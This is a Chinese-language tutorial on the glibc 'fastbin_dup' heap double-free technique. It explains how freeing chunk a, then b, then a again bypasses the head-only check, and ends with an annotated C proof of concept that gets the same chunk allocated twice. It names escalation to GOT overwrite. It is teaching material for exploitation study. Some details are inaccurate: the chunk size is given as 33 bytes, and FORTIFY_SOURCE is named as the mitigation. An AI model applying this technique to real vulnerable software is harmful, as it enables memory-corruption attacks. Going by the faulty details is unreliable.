# 漏洞利用文档：fastbin_dup double-free 攻击

## 攻击对象
- **目标内存区域**: fastbin 链表，具体是 size 为 0x20（对应 chunk size 33 字节，包括元数据）的 fastbin 链表。
- **具体位置**: 堆内存中的 chunk 元数据（如 fd 指针），例如地址 0x602000（chunk a）、0x602020（chunk b）和 0x602040（chunk c）。攻击通过操纵这些 chunk 的 fd 指针，在 fastbin 链表中创建循环结构。

## 利用过程
1. **初始分配**: 分配三个 8 字节的用户数据块（实际 chunk size 为 33 字节），对应 chunk a、b、c。
2. **第一次 free(a)**: 将 chunk a 释放到 fastbin 链表，链表头变为 a。
3. **free(b)**: 将 chunk b 释放到 fastbin 链表，链表变为 b → a，此时 a 不再是链表头。
4. **第二次 free(a)（double-free）**: 再次释放 chunk a，由于 a 不是链表头，检查被绕过，形成循环链表 a → b → a。
5. **malloc 操作**: 执行三次 malloc，依次获取 chunk a、chunk b 和再次获取 chunk a，导致同一内存块（chunk a）被分配两次，实现 UAF。

## 利用条件
- **存在 double-free 漏洞**: 程序允许对同一 chunk 进行多次 free 操作，且没有足够的运行时检查来防止。
- **fastbin 链表操作**: 攻击依赖于 fastbin 的 LIFO 特性和链表管理，通过中间释放其他 chunk 来绕过 double-free 检查。
- **无额外缓解**: 假设 Glibc 版本较低或编译选项未启用严格检查（如 `FORTIFY_SOURCE`）。

## 利用效果
- **Use-After-Free (UAF)**: 同一内存块（chunk a）被分配两次，攻击者可以通过写入和读取该内存来执行类型混淆、数据泄露或控制流劫持。
- **潜在升级**: 结合其他漏洞（如堆溢出），可进一步实现任意地址分配或代码执行，例如通过修改 fd 指针指向敏感区域（如 GOT 表）。

## 涉及缓解机制
Glibc 在 `free` 函数中对 fastbin 进行 double-free 检查，但本攻击通过操作顺序绕过。相关源码来自 Glibc 的 `malloc.c`（以版本 2.23 为例，伪代码形式）：

```c
// _int_free 函数中的 fastbin 处理部分
if (chunk_size <= get_max_fast ()) { // 检查是否为 fastbin 大小
  if (chunk == fastbin_head) {      // 检查是否与链表头相同
    // 检测到 double-free，触发错误（如调用 malloc_printerr）
  } else {
    // 将 chunk 插入 fastbin 链表头部
    chunk->fd = fastbin_head;
    fastbin_head = chunk;
  }
}
```
- **检查逻辑**: 在 free 时，仅检查当前 chunk 是否与 fastbin 链表头相同。如果相同，则报错；否则，允许插入。
- **绕过方法**: 通过先释放另一个 chunk（如 b），改变链表头，使目标 chunk（a）不再是头，从而绕过检查。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释以解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8); // 分配 chunk a，大小 8 字节用户数据，实际 chunk size 33
	int *b = malloc(8); // 分配 chunk b
	int *c = malloc(8); // 分配 chunk c

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a); // 第一次释放 a，a 被加入 fastbin 链表头

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a); // 如果直接再次 free(a)，会触发 double-free 检查，导致崩溃

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b); // 释放 b，fastbin 链表变为 b -> a，a 不再是头

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a); // 第二次释放 a，绕过检查，形成循环链表 a -> b -> a

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8); // 第一次 malloc，获取原 chunk a
	b = malloc(8); // 第二次 malloc，获取原 chunk b
	c = malloc(8); // 第三次 malloc，再次获取原 chunk a（因为循环链表）
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c); // 验证成功，a 和 c 指向同一地址，证明 UAF
}
```
- **注释说明**: 关键步骤包括分配、释放顺序和 malloc 操作，展示了如何创建循环链表和实现 double-free 利用。最终 assert 验证了同一内存被分配两次，确认 UAF 效果。